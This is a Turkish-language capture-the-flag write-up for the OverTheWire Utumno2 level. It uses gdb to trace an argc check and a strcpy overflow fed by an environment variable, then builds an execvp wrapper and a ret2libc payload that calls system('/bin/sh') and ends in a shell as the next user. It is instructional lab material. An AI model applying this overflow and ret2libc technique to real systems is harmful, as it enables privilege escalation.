---
layout: post
title: "Overthewire - Utumno2 Çözümü"
subtitle: "Karışık mevzular"
date: 2019-08-21 22:30:13 +0300
background: '/img/posts/bg.png'
---

# Overthewire Çözümleri - Utumno2

## İpucu
- execvp
- environment variables

## Çözüm

Programı çalıştırdığımızda "Aw.." çıktısı veriyor. Argümanla çalıştırınca da durum değişmiyor. **ltrace** ve **strace**'te bize işe yarar bir bilgi sağlamıyor. O zaman **gdb** ile devam edelim.

```
   0x08048451 <+6>:	cmp    DWORD PTR [ebp+0x8],0x0
   0x08048455 <+10>:	je     0x804846b <main+32>
   0x08048457 <+12>:	push   0x8048510
   0x0804845c <+17>:	call   0x8048310 <puts@plt>
   0x08048461 <+22>:	add    esp,0x4
   0x08048464 <+25>:	push   0x1
   0x08048466 <+27>:	call   0x8048320 <exit@plt>
```

"Aw.." çıktısını main fonksiyonunun hemen başındaki **puts** fonksiyonu mu veriyor kontrol edelim.

```
(gdb) x/s 0x8048510
0x8048510:	"Aw.."
```

Demek ki program öncelikle **ebp+0x8** adresindeki değer 0 mı diye bakıyor, değilse çıkıyor. Breakpoint koyarak bu adreste ne tutuluyormuş bir bakalım.

```
(gdb) break *0x08048451
Breakpoint 1 at 0x8048451: file utumno2.c, line 23.
(gdb) r
Starting program: /utumno/utumno2 

Breakpoint 1, main (argc=1, argv=0xffffd654) at utumno2.c:23
23	utumno2.c: No such file or directory.
(gdb) x/wx $ebp+0x8
0xffffd5c0:	0x00000001
```

1 değeri tutuluyor. Bu değer argüman sayımız olabilir. Bir argüman vererek sayıyı bir daha kontrol edelim.

```
(gdb) r asd
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /utumno/utumno2 asd

Breakpoint 1, main (argc=2, argv=0xffffd654) at utumno2.c:23
23	in utumno2.c
(gdb) x/wx $ebp+0x8
0xffffd5c0:	0x00000002
```

Tahmin ettiğimiz gibi, burada argüman sayımız tutuluyormuş. Zaten genelde argüman sayısı **ebp+0x8**'de, argümanlar da program adından başlamak üzere **ebp+0xc** adresinde tutulur. Bundan sonra programın başında bu adresleri gördüğünüzde tahmininizi daha kolay yapabilirsiniz. Devam edelim.

Programın devam edebilmesi için argüman sayısını 0 yapmamız lazım. Şimdilik program akışını elle değiştirelim ilerleyen kısımlarda argüman sayısını hallederiz.

Prohgramın çıkış yaptığı satırdan itibaren breakpoint koyarak devam ediyoruz.

```
break *0x0804846b
r
set {int}0xffffd5c0=0
c
```

**ebp+0x8**'ın tuttuğu adresin değerini 0 yaparak program akışını değiştiriyoruz ve devam ediyoruz.

```
(gdb) ni
0x0804846e	29	in utumno2.c
(gdb) i r eax
eax            0xffffd654	-10668
(gdb) x/wx $eax
0xffffd654:	0xffffd7a9
(gdb) x/s 0xffffd7a9
0xffffd7a9:	"/utumno/utumno2"
```

Program öncelikle **eax**'e birinci argümanın adresini atıyor. Bu argümandan sonraki stringlere de bakalım.

```
(gdb) x/24s 0xffffd7a9
0xffffd7a9:	"/utumno/utumno2"
0xffffd7b9:	"asd"
0xffffd7bd:	"LC_ALL=en_US.UTF-8"
0xffffd7d0:	"LS_COLORS=rs=0:di=01;...
...
```

Gördüğümüz üzere argümanların sonrasında çevre değişkenleri geliyor. Program **eax**'in üzerine 0x28 ekleyerek devam edecek. **eax**'in tuttuğu adreste ve sonraki adreslerde neler var bakalım.

```
(gdb) x/24wx 0xffffd654
0xffffd654:	0xffffd7a9	0xffffd7b9	0x00000000	0xffffd7bd
0xffffd664:	0xffffd7d0	0xffffdd8c	0xffffdda7	0xffffdddc
0xffffd674:	0xffffddf1	0xffffde09	0xffffde18	0xffffde29
0xffffd684:	0xffffde3e	0xffffde52	0xffffde5f	0xffffde77
0xffffd694:	0xffffde80	0xffffde93	0xffffdeb5	0xffffdecc
0xffffd6a4:	0xffffdee3	0xffffdef6	0xffffdf01	0xffffdf18
(gdb) x/wx 0xffffd7a9
0xffffd7a9:	0x7574752f
(gdb) x/s 0xffffd7a9
0xffffd7a9:	"/utumno/utumno2"
(gdb) x/s 0xffffd7b9
0xffffd7b9:	"asd"
(gdb) x/s 0xffffd7bd
0xffffd7bd:	"LC_ALL=en_US.UTF-8"
```

Gördüğümüz gibi öncelikle program adı, sonra "asd" argümanı, sonra argümanların bittiğini göstermek için 0'lar, sonrasında da çevre değişkenleri. Bir sonrakiş adım **eax**'e 0x28 yani 40 eklemek olacak. Yani **eax**'in değeri **0xffffde18** olmalı.
Devam edip bakalım.

```
(gdb) ni
(gdb) ni
(gdb) i r eax
eax            0xffffde18	-8680
(gdb) x/s 0xffffde18
0xffffde18:	"LANG=en_US.UTF-8"
```

Bir adreste 4 byte tutuluyor ve **eax**'in üzerine 40 byte ekleniyor. Yani biz argüman sayısını 0 yaparsak argüman olarak stack'te sadece 0 olacak. Onun üzerine 40 / 4 = 10 eklenip 10. çevre değişkeni **strcpy** fonksiyonuna argüman olarak verilecek.

**strcpy** fonksiyonu **buffer overflow**'a açık bir fonksiyondur. Bundan ötürü kaç karakterden sonra **overflow** olacağını anlamak için **leave** satırına breakpoint koyup stack'imizin durumuna bakalım.

```
(gdb) x/12wx $esp
0xffffd5ac:	0x474e414c	0x5f6e653d	0x552e5355	0x382d4654
0xffffd5bc:	0xf7e2a200	0x00000000	0xffffd654	0xffffd660
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xf7e2a202 in __libc_start_main () from /lib32/libc.so.6
```

Gördüğümüz üzere program **strcpy** ile içine string kopyalanan adresin 4 DWORD sonrasına dönmek istedi fakat sonuna eklenmiş NULL byte yüzünden patladı.

Artık sömürü planımızı yapabiliriz. Yapmamız gerekenleri sıralayalım:

1. Programı **argc** değeri 0 olacak şekilde çalıştırmak.
2. Onuncu çevre değişkenine 16. karakterden itibaren dönmesini istediğimiz yeri vermek.

Birinci kısmı C ile çok kısa bir kod yazarak halledebiliriz.
C'de **execvp** fonksiyonu bir programı çalıştırmanızı sağlar. Normalde bu fonksiyon şöyle kullanılır.

```c
char *liste[] = { PROGRAM_ADI, ARG1, .. , NULL };
execvp("PROGRAM_YOLU", liste);
```

**execvp** fonksiyonunun 1. parametresi program yolu, ikinci parametresi ise programın argümanlarıdır. Normal şartlarda bu argümanların program adıyla başlayıp NULL ile son bulması gerekir. Biz sadece NULL içeren bir liste verip **argc** değerinin 0 olmasını sağlayacağız.

```sh
cd `mktemp -d`
vim code.c
```

```c
void main() {

    char *null[] = { 0 };

    execvp("/utumno/utumno2", null );

}
```

```sh
gcc -m32 code.c
```

İkinci kısmı halletmek için öncelikle programı döndüreceğimiz adresi bularak başlayalım. **/bin/sh** programını çalıştırmak istediğimizden öncelike **system** fonksiyonunun yerini, daha sonra da **system** fonksiyonunun çalıştıracağı **/bin/sh** stringinin bellekteki yerini bulmamız gerekiyor. 

**system** fonksiyonun yeri için **print &system** dememiz yetiyor.

```
(gdb) print &system
$1 = (<text variable, no debug info> *) 0xf7e4c850 <system>
```

Şimdi de **/bin/sh** stringinin yerini bulmak için C library'sinin belleğin neresine yüklendiğine bakalım.

```
(gdb) info proc mappings
process 30783
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /utumno/utumno2
	 0x8049000  0x804a000     0x1000        0x0 /utumno/utumno2
	0xf7e10000 0xf7e12000     0x2000        0x0 
	0xf7e12000 0xf7fc3000   0x1b1000        0x0 /lib32/libc-2.24.so
```

0xf7e12000 adresini de bulduktan sonra **/lib32/libc-2.24.so** kütüphanesinin kaçıncı byte'ında **/bin/sh** stringinin olduğuna bakalım.

```sh
strings -a -t x /lib32/libc-2.24.so | grep "/bin/sh"

15ccc8
```

Demek ki **/bin/sh** belleğin **0xf7e12000 + 0x15ccc8 = 0xf7f6ecc8** adresinde bulunuyormuş. 

**system** fonksiyonunu kullanmamız için parametreleri şu şekilde stack'e yerleştirmemiz gerekiyor. 

```
Programın döneceği adresten itibaren:
<SYSTEM FONKSİIYONUNUN ADRESİ> <SYSTEM FONKSİYONUNUN DÖNECEĞİ ADRES> <SYSTEM FONKSİYONUNUN ÇALIŞTIRACAĞI KOMUT STRİNGİ>
```

Döneceği adresle ilgilenmediğimizden orayı rastgele verebiliriz.

Sonuç olarak şu şekilde zafiyeti sömürüyoruz:

```sh
env -i DDD=AA DBD=DSD CCC=AS DSCCC=dsfq DSC=SD ASD=sd QQQ=#@ DSDS=ds AFQFQ=sd EXP=`python -c "print 'AAAAAAAAAAAA' + '\x50\xc8\xe4\xf7\x41\x41\x41\x41\xc8\xec\xf6\xf7'"` ./a.out 
```

Çıktı:
```sh
$ whoami
utumno3
```

Burada da program yazmayı bilmenin önemini görmüş olduk.

## Yararlı kaynaklar

execvp - https://www.geeksforgeeks.org/exec-family-of-functions-in-c/

libc atağı - https://www.linkedin.com/pulse/exploiting-stack-buffer-overflow-return-to-libc-intro-hildebrand